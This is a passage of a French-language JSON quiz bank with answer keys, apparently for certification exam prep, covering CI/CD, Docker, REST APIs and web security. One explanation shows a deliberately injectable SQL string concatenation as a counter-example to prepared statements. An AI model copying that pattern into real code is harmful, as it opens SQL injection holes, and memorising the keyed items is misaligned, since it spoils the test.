            "explanation": "L'OWASP (Open Web Application Security Project) est une organisation à but non lucratif de référence. Son fameux 'Top 10' répertorie les failles de sécurité web les plus critiques et courantes (injections SQL, failles XSS, contrôles d'accès défaillants, etc.) et propose des guides pour s'en prémunir."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Quels types de tests logiciels devez-vous mettre en place pour valider une application, et quel outil de l'OWASP permet d'analyser la sécurité ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Uniquement les tests d'acceptation utilisateur, et l'outil OWASP Dependency-Check pour tester le réseau.",
                "Les tests unitaires, d'intégration, fonctionnels et d'acceptation, combinés à un outil comme OWASP ZAP pour scanner les failles.",
                "Uniquement les tests de performance, et l'outil OWASP WebGoat pour héberger le site en production.",
                "Des tests de régression visuelle, et l'outil OWASP SonarQube pour scanner les ports réseau."
            ],
            "correct": 1,
            "explanation": "Une stratégie de test complète comprend : des tests unitaires (fonctions isolées), d'intégration (liaisons entre modules), fonctionnels (parcours utilisateur) et d'acceptation (critères métier). Pour la sécurité, OWASP ZAP (Zed Attack Proxy) est un outil de référence très populaire pour effectuer des scans de vulnérabilités dynamiques sur l'application."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Qu'est-ce que Docker et quel est son principal intérêt pour un projet de développement ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un outil de gestion de bases de données distribuées pour remplacer MySQL.",
                "Un langage de programmation compilé très performant utilisé pour le cloud computing.",
                "Une technologie de conteneurisation permettant d'empaqueter une application et ses dépendances dans un conteneur isolé et reproductible.",
                "Un gestionnaire de paquets JavaScript alternatif à npm."
            ],
            "correct": 2,
            "explanation": "Docker permet de conteneuriser des applications. Contrairement à une machine virtuelle, un conteneur Docker partage le noyau de l'OS hôte, ce qui le rend léger et rapide. Cela garantit que l'application s'exécute de manière identique sur la machine locale du développeur, le serveur de test (staging) et le serveur de production."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Si vous avez une équipe de 10 personnes qui travaillent avec des technologies, des langages et des versions différentes, comment installeriez-vous leur poste de travail ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En laissant chaque développeur installer manuellement ses outils, ce qui favorise l'autonomie totale.",
                "En standardisant l'environnement via des outils de provisionnement automatisé, des conteneurs et des images réutilisables, avec un socle commun et des versions pinées.",
                "En imposant une seule technologie pour tout le monde, même si elle ne convient pas à certains projets.",
                "En demandant à chacun d'utiliser le même portable sans configuration spécifique."
            ],
            "correct": 1,
            "explanation": "Avec une équipe hétérogène, le plus fiable est de standardiser le socle de base (outils, versions, variables d'environnement) puis d'isoler chaque projet dans son propre environnement. Cela peut passer par Docker, des fichiers de configuration, des scripts de provisionnement et des versions imposées par le dépôt. Ainsi, on évite les erreurs liées aux versions, les dépendances cachées et les conflits entre projets."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Pourquoi choisir Docker plutôt qu'une machine virtuelle pour un environnement de développement ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Parce que la VM est toujours plus rapide à démarrer et plus légère.",
                "Parce que Docker est plus léger, plus rapide à provisionner et reproduit de façon cohérente les dépendances de l'application sans charger un système d'exploitation complet.",
                "Parce que Docker remplace complètement la sécurité du système d'exploitation.",
                "Parce qu'une VM ne peut pas être utilisée pour des services web."
            ],
            "correct": 1,
            "explanation": "Une machine virtuelle nécessite son propre système d'exploitation complet, ce qui la rend plus lourde et plus lente à démarrer. Docker, lui, exécute des conteneurs qui partagent le noyau du système hôte. Cela permet de reproduire l'environnement de manière fiable, d'installer rapidement des dépendances et de limiter le coût système, tout en restant très portable entre environnements."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Qu'est-ce qu'une machine virtuelle embarque que Docker n'embarque pas ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Un noyau de système d'exploitation complet et son propre environnement d'exécution, ce qui la rend plus isolée qu'un conteneur.",
                "Un moteur de conteneurisation intégré dans le système.",
                "Un dépôt Git de référence pour le code source.",
                "Un outil de test automatisé intégré directement dans le système d'exploitation."
            ],
            "correct": 0,
            "explanation": "Une machine virtuelle contient un système d'exploitation invité complet avec son propre noyau et ses propres services, ce qui la rend plus isolée. Docker ne virtualise pas un SO complet : il partage le noyau du système hôte et exécute des conteneurs de manière plus légère. C'est pourquoi Docker est plus rapide et plus léger, mais une VM apporte une isolation davantage au niveau du système."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Qu'est-ce que le hashage et peut-on le déhasher ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le hashage est une transformation d'un message en une valeur de taille fixe, et il est généralement impossible à déchiffrer à partir de la valeur hachée seule.",
                "Le hashage est une méthode pour compresser les données en base de données sans perte.",
                "Le hashage consiste à écrire un mot de passe en clair dans un fichier de configuration.",
                "Le hashage est un chiffrement symétrique reversible."
            ],
            "correct": 0,
            "explanation": "Le hashage transforme une donnée en une empreinte numérique unique (digest) selon un algorithme comme SHA-256 ou bcrypt. Il est conçu pour être irréversible en pratique : on ne peut pas retrouver la donnée d'origine à partir du hash seul, sauf en utilisant des attaques de force brute ou des tables de rainbow sur des mots courants. C'est pourquoi le hashage est utilisé pour sécuriser les mots de passe et vérifier l'intégrité des données."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Quelles failles de sécurité pouvez-vous citer pour un site web ou une application ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Les injections SQL, les XSS, les CSRF, les failles d'authentification, les dépendances vulnérables et les erreurs de validation des entrées.",
                "Uniquement les erreurs de typographie dans le code HTML.",
                "Les erreurs de CSS et de mise en page uniquement.",
                "Les failles de sécurité ne concernent que les applications mobiles, pas les sites web."
            ],
            "correct": 0,
            "explanation": "Les failles de sécurité les plus connues incluent les injections SQL, les failles XSS (scripts cross-site), les attaques CSRF (requêtes forcées), les erreurs de gestion des accès, les mots de passe faibles, les dépendances non sécurisées et les problèmes de validation des entrées. Une application sécurisée doit combiner validation, chiffrement, gestion des droits et tests de sécurité."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Quelle est la différence entre une image Docker et un conteneur ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "L'image est le modèle figé et réutilisable (code, dépendances, configuration) ; le conteneur est une instance en cours d'exécution créée à partir de cette image, isolée et éphémère",
                "L'image est la capture d'écran du conteneur en marche",
                "Le conteneur est stocké sur Docker Hub, l'image tourne en local",
                "Il n'y a aucune différence : les deux mots désignent le même processus"
            ],
            "correct": 0,
            "explanation": "Analogie classe/objet : l'image est la classe, le conteneur est l'objet.\n- image : modèle en lecture seule, construit depuis un Dockerfile (superposition de couches), versionnable (tags), partageable via un registre (Docker Hub) ;\n- conteneur : processus isolé lancé depuis une image (docker run), avec son système de fichiers, son réseau et ses processus propres, partageant le noyau de l'hôte.\nPlusieurs conteneurs peuvent tourner à partir de la même image ; un conteneur est éphémère par conception - les données persistent via des volumes, pas dans le conteneur.\nCommandes clés : docker build -> image, docker run -> conteneur."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Comment déployez-vous votre application en production ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "En copiant-collant manuellement les fichiers par FTP directement sur le serveur de production, sans test préalable",
                "En demandant à chaque utilisateur d'installer le site sur sa machine",
                "En envoyant le code par e-mail à l'hébergeur qui l'installe à la main",
                "Via un pipeline automatisé : build de l'application, exécution des tests, construction d'un artefact ou d'une image versionné, déploiement vérifié en recette puis en production, avec possibilité de retour arrière (rollback)"
            ],
            "correct": 3,
            "explanation": "Démarche type d'un déploiement maîtrisé :\n1. fusion sur la branche principale ;\n2. le pipeline (GitHub Actions, GitLab CI, Jenkins) construit et exécute la suite de tests ;\n3. production d'un artefact/image versionné (tag de version, reproductible) ;\n4. validation en environnement de recette/staging (proche de la production) ;\n5. mise en production, idéalement automatisée, avec migrations de base si besoin ;\n6. plan de rollback : comment revenir à la version précédente rapidement.\nAlternatives selon l'hébergement : PaaS (Vercel, Heroku), conteneurs, déploiement Git.\nEn oral, décrire son pipeline réel et dire ce qui bloquerait un retour arrière (migrations de données notamment)."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Que se passe-t-il lorsqu'un développeur pousse son code sur Git ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Le code part directement en production sans aucune vérification",
                "Rien de plus : le dépôt distant enregistre le commit, aucun processus ne peut s'exécuter",
                "Le code est automatiquement supprimé s'il contient une erreur",
                "Le dépôt distant enregistre le push, et des webhooks déclenchent le pipeline CI : installation des dépendances, lint, tests automatisés, analyse qualité, puis éventuellement la livraison (CD) vers les environnements jusqu'à la production"
            ],
            "correct": 3,
            "explanation": "Enchaînement CI/CD typique :\n1. git push vers la plateforme (GitHub, GitLab) ;\n2. un webhook déclenche le pipeline sur un runner ;\n3. étapes : installation des dépendances, lint, tests unitaires et d'intégration, build, analyse qualité (SonarQube) ;\n4. si échec : pipeline rouge, la merge request est bloquée, le code n'atteint pas la branche principale ;\n5. si succès : artefact produit, déploiement automatique en recette, puis en production selon la stratégie choisie.\nPoint clé : personne ne valide 'à la main' un code non testé - c'est le push qui déclenche la vérification, systématiquement et identiquement pour tous."
        }
    ],
    "Le Back-end & les API": [
        {
            "theme": "Le Back-end & les API",
            "question": "Comment fonctionne une requête HTTP ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le navigateur écrit directement dans la base de données du serveur",
                "Le client envoie une requête composée d'une méthode (GET, POST...), d'une URL, d'en-têtes et parfois d'un corps ; le serveur la traite puis renvoie une réponse avec un code de statut et souvent un corps (HTML, JSON...)",
                "La requête HTTP est un e-mail envoyé au serveur contenant la page demandée",
                "Le serveur envoie la requête au client, qui décide ensuite des données à afficher"
            ],
            "correct": 1,
            "explanation": "HTTP fonctionne selon le modèle client/serveur en mode requête/réponse.\nUne requête contient :\n- une ligne de requête : méthode (GET, POST, PUT, DELETE...) + URL + version du protocole ;\n- des en-têtes (Host, Content-Type, Cookie, Authorization...) ;\n- un corps (body) pour les méthodes comme POST.\nLa réponse contient :\n- un code de statut : 2xx succès (200 OK, 201 Created), 3xx redirection, 4xx erreur client (404, 403), 5xx erreur serveur ;\n- des en-têtes puis le corps de la réponse.\nHTTP est sans état (stateless) : chaque requête est indépendante, d'où l'usage des cookies et des sessions pour maintenir l'état d'un utilisateur. HTTPS chiffre les échanges (TLS)."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Quelle est la différence entre les méthodes HTTP GET et POST ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "GET et POST sont strictement équivalentes, seule l'orthographe change",
                "POST est plus sécurisée car elle chiffre automatiquement les données",
                "GET sert uniquement aux images et POST aux vidéos",
                "GET demande une ressource au serveur (paramètres visibles dans l'URL, cacheable, sans corps) ; POST envoie des données au serveur pour créer ou traiter (données dans le corps, non cacheable)"
            ],
            "correct": 3,
            "explanation": "GET :\n- demande de lecture d'une ressource ;\n- paramètres envoyés dans l'URL (query string : ?id=12) ;\n- cacheable, mettable en favori, idempotente (répéter la requête ne change pas le résultat) ;\n- longueur d'URL limitée et données visibles : jamais de mot de passe en GET.\nPOST :\n- envoie de données à traiter (création d'un compte, soumission de formulaire) ;\n- données dans le corps de la requête, non visibles dans l'URL ;\n- non cacheable, non idempotente.\nAttention : POST n'est pas un mécanisme de sécurité - le chiffrement vient de HTTPS. Une donnée sensible doit toujours passer par POST + HTTPS."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Quand utiliser PUT ou PATCH ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "PUT remplace complètement la ressource (on envoie l'objet complet), PATCH applique une modification partielle (on envoie uniquement les champs à modifier)",
                "PUT crée une ressource, PATCH la supprime",
                "PUT est la version sécurisée de PATCH, à utiliser uniquement en production",
                "PATCH envoie les données en clair alors que PUT les chiffre"
            ],
            "correct": 0,
            "explanation": "Dans une API REST, les deux méthodes modifient une ressource existante, mais pas de la même façon :\n- PUT /utilisateurs/12 : le client envoie la représentation complète de la ressource ; si un champ est omis, il est écrasé. PUT est idempotent (le même appel répété donne le même état final) ;\n- PATCH /utilisateurs/12 : le client envoie seulement les champs à changer, par exemple { \"email\": \"nouveau@mail.fr\" }.\nExemple concret : éditer tout un profil utilisateur depuis un formulaire complet -> PUT ; corriger un seul champ ou cocher une option -> PATCH.\nSavoir distinguer ces verbes montre la maîtrise du vocabulaire REST attendu à l'oral."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Comment fonctionne une API REST ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une API REST utilise le protocole FTP pour transférer les données",
                "Une API REST expose des ressources identifiées par des URL et manipulées via les méthodes HTTP (GET, POST, PUT, PATCH, DELETE), avec des échanges généralement au format JSON et sans état",
                "Une API REST est une bibliothèque JavaScript incluse directement dans la page HTML",
                "Une API REST est un serveur qui renvoie toujours des pages HTML complètes pour chaque requête"
            ],
            "correct": 1,
            "explanation": "REST (Representational State Transfer) est un style d'architecture pour les API web.\nPrincipes :\n- tout est ressource, identifiée par une URL : /utilisateurs, /commandes/58 ;\n- les méthodes HTTP représentent les actions : GET (lire), POST (créer), PUT/PATCH (modifier), DELETE (supprimer) ;\n- les échanges sont sans état (stateless) : chaque requête contient ce qu'il faut pour la traiter (token d'authentification par exemple) ;\n- les données sont habituellement au format JSON.\nExemple :\nGET /api/utilisateurs      -> liste des utilisateurs (200)\nPOST /api/utilisateurs    -> création (201)\nPUT /api/utilisateurs/12   -> modification complète\nCe découplage permet à un front (web, mobile) et un back d'évoluer indépendamment."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Qu'est-ce qu'un endpoint ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un endpoint est le point d'entrée final du câble réseau du serveur",
                "Un endpoint est le dernier fichier installé sur le serveur lors du déploiement",
                "Un endpoint est un mot de passe chiffré utilisé pour appeler une API",
                "Un endpoint est une URL spécifique d'une API qui donne accès à une ressource ou à une fonctionnalité, associée à une méthode HTTP (ex : GET /api/utilisateurs/12)"
            ],
            "correct": 3,
            "explanation": "Un endpoint désigne une adresse précise d'une API, combinée à la méthode HTTP utilisée pour l'appeler.\nExemples :\n- GET /api/utilisateurs -> liste des utilisateurs ;\n- GET /api/utilisateurs/12 -> détail d'un utilisateur ;\n- POST /api/connexion -> authentification.\nL'ensemble des endpoints d'une API constitue son contrat : le front ne communique avec le back qu'à travers ces points d'entrée.\nBonnes pratiques : URLs cohérentes et au pluriel, versionnage (/api/v1/...), regroupement logique par ressource. Savoir citer les endpoints de son propre projet est très valorisé à l'oral."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Comment gérez-vous les erreurs côté back-end ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En laissant le serveur planter et en affichant une page blanche à l'utilisateur",
                "En renvoyant toujours le code 200 avec le message d'erreur caché dans la page",
                "En interceptant les erreurs (try/catch), en renvoyant un code de statut HTTP adapté (400, 401, 404, 500...) avec un message clair, en journalisant côté serveur sans divulguer d'informations sensibles",
                "En désactivant la gestion des erreurs en production pour améliorer les performances"
            ],
            "correct": 2,
            "explanation": "Une gestion d'erreurs soignée se fait à plusieurs niveaux :\n- validation des entrées : données absentes ou invalides -> 400 ou 422 avec un message indiquant le champ concerné ;\n- ressource introuvable -> 404 ; utilisateur non authentifié -> 401, non autorisé -> 403 ;\n- erreurs inattendues -> 500, capturées par un try/catch global, avec log serveur détaillé mais réponse volontairement vague pour ne pas exposer la stack trace ou la configuration ;\n- réponses JSON structurées : { \"erreur\": \"E-mail déjà utilisé\" } ;\n- journalisation (logs) pour diagnostiquer, monitoring pour alerter.\nÀ l'oral, appuyer sur : code HTTP juste + message utile côté client + log complet côté serveur."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Comment protéger des routes dans une application web ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En cachant les boutons qui mènent aux pages protégées dans l'interface",
                "En utilisant un middleware d'authentification qui vérifie la session ou le token de l'utilisateur et refuse l'accès (401/403) si ses droits sont insuffisants",
                "En renommant les URL d'administration avec des caractères compliqués pour qu'elles soient introuvables",
                "En protégeant uniquement la page de connexion, les autres pages étant sûres par défaut"
            ],
            "correct": 1,
            "explanation": "La protection des routes se fait toujours côté serveur, avant l'exécution du contrôleur :\n- un middleware (Express), un décorateur (Django) ou un middleware de route (Laravel) intercepte chaque requête ;\n- il vérifie que l'utilisateur est authentifié (session valide ou token JWT) ; sinon -> 401 ;\n- il vérifie ensuite ses droits (rôle admin, propriétaire de la ressource) ; sinon -> 403 ;\n- seulement après, le contrôleur s'exécute.\nMasquer un bouton dans l'interface ne protège rien : n'importe qui peut forger la requête. C'est un point que le jury vérifie souvent : la sécurité se joue côté serveur.\nDans un projet, citer des exemples concrets de routes protégées (back-office, modification d'un profil, suppression d'une ressource)."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Qu'est-ce qu'une API ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Une API est une bibliothèque de graphiques pour analyser les données d'un site",
                "Une API est un logiciel antivirus qui protège les requêtes web",
                "Une API (Application Programming Interface) est un ensemble de règles et de points d'accès qui permet à deux applications de communiquer et d'échanger des données, sans connaître leur fonctionnement interne",
                "Une API est une base de données publique accessible sans authentification"
            ],
            "correct": 2,
            "explanation": "Une API est un contrat d'échange entre deux programmes : elle expose des points d'accès (endpoints), des formats de données et des règles d'appel.\nAnalogie classique : au restaurant, le menu (et le serveur) fait l'interface entre le client et la cuisine - on commande sans entrer en cuisine.\nExemples :\n- le front d'une application appelle l'API de son back pour obtenir des données en JSON ;\n- une API météo, une API de paiement (Stripe), une API de connexion (OAuth Google).\nLes styles les plus connus sont REST (HTTP + JSON), SOAP (XML) et GraphQL.\nLes API permettent le découplage : chaque application évolue de son côté tant que le contrat est respecté."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Expliquez le parcours d'une requête depuis le navigateur jusqu'à la base de données.",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "L'utilisateur agit sur l'interface, une requête HTTP est envoyée, le serveur la reçoit, le back-end exécute la logique métier, la base de données est interrogée, le serveur renvoie une réponse, l'interface affiche les données",
                "Le navigateur interroge directement la base de données, puis le serveur affiche le résultat",
                "La base de données envoie les données à l'interface sans passer par le serveur",
                "Le serveur envoie d'abord la réponse, puis reçoit la requête, et la base de données met à jour l'interface"
            ],
            "correct": 0,
            "explanation": "Le parcours complet d'une requête :\n1. l'utilisateur agit sur l'interface (clic, soumission de formulaire) ;\n2. une requête HTTP est envoyée (fetch, navigation) ;\n3. le serveur reçoit la requête (routage vers le bon contrôleur) ;\n4. le back-end exécute la logique métier (validation, règles) ;\n5. la base de données est interrogée (requête SQL via le modèle) ;\n6. le serveur renvoie une réponse (JSON, HTML) avec un code de statut ;\n7. l'interface affiche les données (mise à jour du DOM).\nÀ l'oral, dérouler ce flux avec un exemple précis de son projet (ex : la soumission d'un formulaire de contact, du clic à l'enregistrement en base) montre une vision d'ensemble très appréciée du jury."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Que se passe-t-il lorsqu'on tape une URL dans un navigateur ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le navigateur recherche la page dans son cache permanent et l'affiche toujours sans contact réseau",
                "Le serveur ouvre une connexion vers le navigateur et attend que l'utilisateur clique",
                "Le navigateur résout le domaine via le DNS, ouvre une connexion (TCP/TLS), envoie une requête HTTP au serveur, qui renvoie une réponse que le navigateur interprète (HTML, CSS, JS) pour afficher la page",
                "L'URL est convertie en adresse e-mail pour contacter l'administrateur du site"
            ],
            "correct": 2,
            "explanation": "Les étapes principales :\n1. résolution DNS : le nom de domaine est traduit en adresse IP ;\n2. établissement de la connexion TCP, puis handshake TLS si HTTPS ;\n3. envoi de la requête HTTP GET au serveur ;\n4. le serveur traite la requête et renvoie une réponse (statut + corps) ;\n5. le navigateur analyse le HTML (DOM), charge le CSS (CSSOM) et le JavaScript, puis construit et affiche le rendu ;\n6. les ressources complémentaires (images, scripts, requêtes API) sont chargées à leur tour.\nC'est une question d'oral classique pour vérifier la vision globale : savoir enchaîner DNS -> TCP/TLS -> HTTP -> rendu, sans détail superflu, est très valorisant."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Quels verbes HTTP utilisez-vous dans votre API et à quoi servent-ils ?",
            "level": "Facile",
            "filiere": "CDA",
            "answers": [
                "GET (lire), POST (créer), PUT (remplacer), PATCH (modifier partiellement), DELETE (supprimer)",
                "SELECT, INSERT, UPDATE et DELETE directement dans l'URL",
                "Uniquement GET pour tout, afin de simplifier la documentation",
                "CREATE, READ, UPDATE et DESTROY"
            ],
            "correct": 0,
            "explanation": "Le mappage REST standard :\n- GET /ressources -> liste ; GET /ressources/12 -> détail ;\n- POST /ressources -> création (réponse 201 Created) ;\n- PUT /ressources/12 -> remplacement complet ; PATCH /ressources/12 -> modification partielle ;\n- DELETE /ressources/12 -> suppression.\nChaque verbe s'accompagne de sa famille de codes de statut : 2xx succès, 3xx redirection, 4xx erreur client, 5xx erreur serveur.\nEn oral, citer les endpoints de son projet qui utilisent chaque verbe (et les codes renvoyés) prouve la cohérence REST de l'API."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Comment gérez-vous le versioning d'une API ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "En supprimant les anciennes versions dès qu'une nouvelle est publiée",
                "En changeant le nom du serveur à chaque nouvelle version",
                "En envoyant un e-mail aux clients pour leur demander d'adapter leur code sans délai",
                "En exposant des versions distinctes dans les URL (/api/v1/, /api/v2/) ou via un en-tête, avec une période de transition où les deux versions coexistent, puis en dépréciant proprement l'ancienne"
            ],
            "correct": 3,
            "explanation": "Pourquoi versionner : un changement de contrat (champ renommé, paramètre devenu obligatoire) casse les clients existants si on modifie l'API en place.\nMéthodes de versioning :\n- dans l'URL (la plus répandue et la plus lisible) : /api/v2/utilisateurs ;\n- dans un en-tête HTTP (Accept, ou un en-tête dédié X-API-Version) ;\n- par date (style AWS).\nCycle de vie : publier la nouvelle version, maintenir l'ancienne (au moins correctifs), annoncer la dépréciation (documentation, en-tête Sunset), puis retirer après un délai annoncé.\nEn projet de formation, une seule version suffit, mais savoir expliquer la démarche démontre une vision d'API en production."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Pourquoi utiliser JSON pour les échanges avec votre API ?",
            "level": "Facile",
            "filiere": "CDA",
            "answers": [
                "Parce que c'est le seul format que JavaScript sait lire, sans exception possible",
                "Parce que JSON est plus sécurisant que HTTPS",
                "Pour alourdir volontairement les réponses et tester la robustesse du réseau",
                "Parce que JSON est léger, lisible, nativement compris par les navigateurs (parse/stringify), indépendant du langage serveur et standard de facto des API REST"
            ],
            "correct": 3,
            "explanation": "Avantages de JSON :\n- sérialisation compacte (moins verbeux que XML) ;\n- lisible par un humain, donc débogable facilement ;\n- mappé naturellement sur les objets JavaScript (const donnees = await reponse.json()) ;\n- supporté par tous les langages serveur (json_encode en PHP, modules json en Python, bibliothèques en Java) ;\n- en-tête standard : Content-Type: application/json.\nAlternatives : XML (SOAP, verbeux), YAML (plutôt configuration), formats binaires (protobuf) pour des cas de performance très spécifiques.\nPrécision d'oral : JSON ne remplace pas la sécurité - HTTPS, validation des entrées et authentification restent nécessaires."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Comment documenter une API et que connaissez-vous de Swagger/OpenAPI ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "La documentation est inutile si le code est bien écrit",
                "On documente uniquement oralement, au cas par cas",
                "La documentation doit rester secrète pour éviter les attaques",
                "En décrivant chaque endpoint (URL, verbe, paramètres, réponses, codes d'erreur, exemples) ; Swagger/OpenAPI est le standard : un fichier décrit l'API et génère une documentation interactive qui permet de tester les requêtes"
            ],
            "correct": 3,
            "explanation": "Une bonne documentation d'API décrit pour chaque endpoint : verbe et URL, authentification requise, paramètres (types, obligatoires, défauts), schéma des réponses, codes d'erreur possibles (400, 401, 404, 422) et exemples concrets.\nSwagger/OpenAPI :\n- spécification standard de description d'API (fichier YAML/JSON) ;\n- rendue en documentation interactive (Swagger UI) où l'on peut exécuter les requêtes depuis le navigateur ;\n- outils associés : Swagger Editor, Postman (import d'une spec OpenAPI).\nBénéfices : le front et le back avancent en parallèle sur un contrat partagé ('contract first'), l'intégration et la maintenance sont accélérées."
        },
        {
            "theme": "Le Back-end & les API",
            "question": "Comment un client consomme-t-il votre API ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Il écrit directement dans les fichiers du serveur",
                "Il envoie des requêtes HTTP vers les endpoints (fetch/axios côté front, ou appel serveur-à-serveur), avec le token d'authentification dans l'en-tête Authorization, puis lit la réponse JSON et gère les codes d'erreur",
                "Il ouvre la base de données depuis son navigateur avec un client SQL",
                "Il reçoit spontanément toutes les données du serveur sans jamais rien demander"
            ],
            "correct": 1,
            "explanation": "Flux type de consommation :\n1. le client appelle POST /api/login et reçoit un token (session ou JWT) ;\n2. chaque requête suivante porte l'en-tête Authorization: Bearer <token> ;\n3. le serveur vérifie le token via un middleware, exécute le traitement, répond en JSON avec un code de statut ;\n4. le front affiche les données ou gère l'erreur (401 -> rediriger vers la connexion, 403 -> afficher un message d'accès refusé).\nOutils clients : fetch/axios côté navigateur, Postman pour les tests manuels, code serveur pour les appels serveur-à-serveur.\nPoint technique à connaître : le serveur doit autoriser l'origine du front via CORS."
        }
    ],
    "La sécurité": [
        {
            "theme": "La sécurité",
            "question": "Comment stockez-vous les mots de passe des utilisateurs ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Dans une table SQL en clair, pour pouvoir les renvoyer par e-mail en cas d'oubli",
                "Chiffrés avec un algorithme symétrique réversible, pour pouvoir les relire à la connexion",
                "Hashés avec un algorithme lent et salé, conçu pour les mots de passe (bcrypt, Argon2)",
                "Dans un fichier texte à la racine du projet, hors de la base de données"
            ],
            "correct": 2,
            "explanation": "Les mots de passe ne se stockent ni en clair ni chiffrés de façon réversible : ils se hachent.\n- le hash (bcrypt, Argon2) est une empreinte à sens unique : le serveur peut vérifier un mot de passe (on re-hash la saisie et on compare) mais ne peut pas le retrouver ;\n- ces algorithmes sont volontairement lents et intègrent un sel (salt), ce qui neutralise les tables précalculées et ralentit fortement la force brute ;\n- en PHP : password_hash($motDePasse, PASSWORD_BCRYPT) à l'inscription et password_verify() à la connexion.\nCompléments attendus : jamais de renvoi du mot de passe par e-mail - on envoie un lien temporaire de réinitialisation ; le RGPD considère les mots de passe comme des données sensibles."
        },
        {
            "theme": "La sécurité",
            "question": "Pourquoi les mots de passe ne doivent-ils jamais être stockés en clair ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Parce qu'un mot de passe en clair ralentit les requêtes SQL de la base",
                "Parce que si la base fuite, les attaquants obtiendraient directement les mots de passe, souvent réutilisés par les utilisateurs sur d'autres services ; le hash rend cette lecture impossible",
                "Parce que le SGBD interdit le stockage de texte en clair dans les colonnes",
                "Uniquement pour respecter une recommandation des navigateurs"
            ],
            "correct": 1,
            "explanation": "Le raisonnement se fait 'en cas de fuite' : aucune base n'est à l'abri (faille, sauvegarde perdue, accès interne malveillant).\nSi les mots de passe sont en clair, une fuite expose directement tous les comptes. Or les utilisateurs réutilisent souvent le même mot de passe partout : les attaquants tentent ces identifiants sur d'autres sites ('credential stuffing').\nAvec un hash salé et lent (bcrypt/Argon2), la fuite ne révèle pas les mots de passe : les attaquants devraient casser chaque hash un par un, à très grand coût.\nAjouts d'oral : le sel empêche les attaques par tables précalculées (rainbow tables) ; le RGPD impose de protéger ces données sensibles, avec information des utilisateurs en cas de fuite."
        },
        {
            "theme": "La sécurité",
            "question": "Comment se protéger d'une injection SQL ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En utilisant des requêtes préparées avec des paramètres liés, sans jamais concaténer les entrées utilisateur dans la requête",
                "En supprimant certaines lettres des mots de passe pour fausser les attaquants",
                "En cachant simplement les messages d'erreur du serveur",
                "En utilisant exclusivement des requêtes GET plutôt que POST"
            ],
            "correct": 0,
            "explanation": "La protection principale est la requête préparée : le SQL et les données sont envoyés séparément au SGBD, les paramètres ne peuvent donc pas être interprétés comme du code.\nExemple vulnérable (à ne jamais faire) :\n\"SELECT * FROM users WHERE email = '\" + email + \"'\"  // concaténation dangereuse\nVersion protégée en PHP/PDO :\n$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');\n$stmt->execute(['email' => $email]);\nCompléments :\n- valider/filtrer les entrées (type, longueur, format) ;\n- compte SQL à privilèges minimaux ;\n- contraintes côté base (longueurs de colonnes réalistes) ;\n- un ORM (Eloquent, Doctrine) prépare les requêtes par défaut.\nMasquer les erreurs ne suffit pas : cela réduit l'information donnée à l'attaquant mais ne l'empêche pas d'injecter."
        },
        {
            "theme": "La sécurité",
            "question": "Qu'est-ce qu'une faille XSS (Cross-Site Scripting) et comment s'en protéger ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le XSS bloque le navigateur en téléchargeant trop de scripts externes",
                "Le XSS est un virus installé sur le serveur qui chiffre tous les fichiers",
                "Le XSS est une attaque qui envoie des e-mails depuis le site sans autorisation",
                "Le XSS consiste à injecter du JavaScript malveillant dans une page, via un champ non échappé, exécuté ensuite dans le navigateur des visiteurs ; on s'en protège en échappant les données affichées, en validant les entrées et en renforçant la politique CSP"
            ],
            "correct": 3,
